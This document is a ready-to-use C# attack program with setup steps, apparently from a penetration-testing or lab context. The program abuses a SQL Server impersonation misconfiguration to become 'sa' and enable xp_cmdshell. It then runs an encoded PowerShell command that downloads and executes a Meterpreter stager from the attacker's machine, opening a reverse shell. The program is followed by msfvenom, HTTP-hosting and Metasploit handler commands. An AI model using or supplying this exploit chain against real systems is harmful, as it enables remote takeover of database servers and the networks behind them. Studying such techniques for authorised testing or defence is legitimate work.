

Adjust values as needed. "sa" and "master", most notably. Requires low-priv SQL access + IMPERSONATE on sa misconfig. Runs entirely in memory

```
using System;
using System.Data.SqlClient;
using System.Text;  // Needed for Encoding.Unicode and base64

namespace SQLRevShell
{
    class Program
    {
        static void Main(string[] args)
        {
            // === CONFIGURABLE SECTION - CHANGE THESE FOR EACH ENGAGEMENT ===
            string sqlServer = "192.168.118.5";          // Target SQL Server IP/hostname
            string database   = "master";                // Database to connect to (master has sysadmin access)
            string attackerIP = "192.168.45.186";        // Your attacking machine IP (LHOST)
            int    httpPort   = 8080;                    // Port you're serving stager.ps1 on
            int    revPort    = 443;                     // Reverse shell port (443 often allowed outbound)

            // Connection string - uses current Windows user (Integrated Security)
            string conString = $"Server={sqlServer};Database={database};Integrated Security=True;";
            
            // Open SQL connection
            using (SqlConnection con = new SqlConnection(conString))
            {
                try
                {
                    con.Open();
                    Console.WriteLine("Auth success!");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Auth failed: {ex.Message}");
                    return;  // Exit if no connection
                }

                try
                {
                    // === PRIVILEGE ESCALATION VIA IMPERSONATION ===
                    // Impersonate 'sa' - requires IMPERSONATE permission on sa (common lab misconfig)
                    ExecuteNonQuery(con, "EXECUTE AS LOGIN = 'sa';");
                    Console.WriteLine("Impersonation to 'sa' succeeded.");

                    // === ENABLE XP_CMDSHELL ===
                    // Turn on advanced options and enable xp_cmdshell (requires sysadmin)
                    ExecuteNonQuery(con, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
                    ExecuteNonQuery(con, "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
                    Console.WriteLine("xp_cmdshell enabled.");

                    // === IN-MEMORY STAGED METERPRETER PAYLOAD ===
                    // PowerShell one-liner: download and execute stager.ps1 from your web server
                    string psCommand = $"IEX ((New-Object Net.WebClient).DownloadString('http://{attackerIP}:{httpPort}/stager.ps1'))";

                    // Base64 encode the command (Unicode) to avoid quoting/syntax issues in xp_cmdshell
                    byte[] bytes = Encoding.Unicode.GetBytes(psCommand);
                    string encoded = Convert.ToBase64String(bytes);

                    // Execute via xp_cmdshell - clean, no quoting problems
                    ExecuteNonQuery(con, $"EXEC xp_cmdshell 'powershell -enc {encoded}'");

                    Console.WriteLine("In-memory staged Meterpreter triggered (reverse to port 443). Await session.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Operation failed: {ex.Message}");
                }
                finally
                {
                    // Always revert impersonation to avoid breaking the session/context
                    try { ExecuteNonQuery(con, "REVERT;"); } catch { }
                }

                con.Close();
            }

            Console.WriteLine("\nDone.");
        }

        // Helper method to run non-query SQL commands
        static void ExecuteNonQuery(SqlConnection con, string query)
        {
            using (SqlCommand cmd = new SqlCommand(query, con))
            {
                cmd.ExecuteNonQuery();
            }
        }
    }
}
```

Generate Stager (on attacker box)
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f psh-net > stager.ps1
```

Host stager

```
python3 -m http.server 8080
```

Start handler:

```
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT <YOUR_PORT>
exploit
```

